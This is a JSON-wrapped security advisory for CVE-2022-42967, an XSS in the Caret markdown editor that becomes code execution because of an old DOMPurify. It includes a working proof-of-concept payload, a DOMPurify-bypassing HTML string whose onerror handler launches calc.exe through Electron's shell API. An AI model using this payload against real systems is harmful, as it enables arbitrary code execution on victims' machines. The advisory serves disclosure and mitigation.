{"hash":"c3d7ecf1d3b2aa0ef58b3bd0779ae7af562e03ad","data":{"post":{"title":"Caret XSS RCE","path":"/vulnerabilities/caret-xss-rce/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>XSS in Caret markdown editor leads to remote code execution when viewing crafted Markdown files</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p><a href=\"https://caret.io/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Caret Editor</a></p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>All versions are affected</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>This issue is caused due to insufficient validation of the document data, which is sent to the\nElectron renderer.\nSpecifically, in the <code>getMarkdownHtmlElement</code> function in the file\n<code>app.asar/extensions/Markdown/Markdown.js</code> -</p>\n<p><code>t.firstChild.innerHTML = DOMPurify.sanitize(r)</code></p>\n<p>An older version of <a href=\"https://github.com/cure53/DOMPurify\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">DOMPurify</a> is used, which has known filtering bypasses (see below)</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<p>Opening a document with the following contents, <strong>when preview mode is enabled</strong>, leads to the\nimmediate execution of an arbitrary process (in this case - Calculator) -</p>\n<pre><code class=\"language-html\">&#x3C;form>&#x3C;math>&#x3C;mtext>&#x3C;/form>&#x3C;form>&#x3C;mglyph>&#x3C;style>&#x3C;/math>&#x3C;img src\nonerror=\"try{ const {shell} = require('electron');\nshell.openExternal('file:C:/Windows/System32/calc.exe') }catch(e){alert(e)}\">\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>Disable Caret's \"Preview Mode\"</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-42967\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">NVD</a></p>\n","description":"CVE-2022-42967 High severity. XSS in Caret markdown editor leads to remote code execution when viewing crafted Markdown files","date_published":"2023-01-10","xray_id":"","vul_id":"CVE-2022-42967","severity":"high","discovered_by":"Denys Vozniuk","last_updated":"2023-01-10","cvss":7.5}},"context":{}}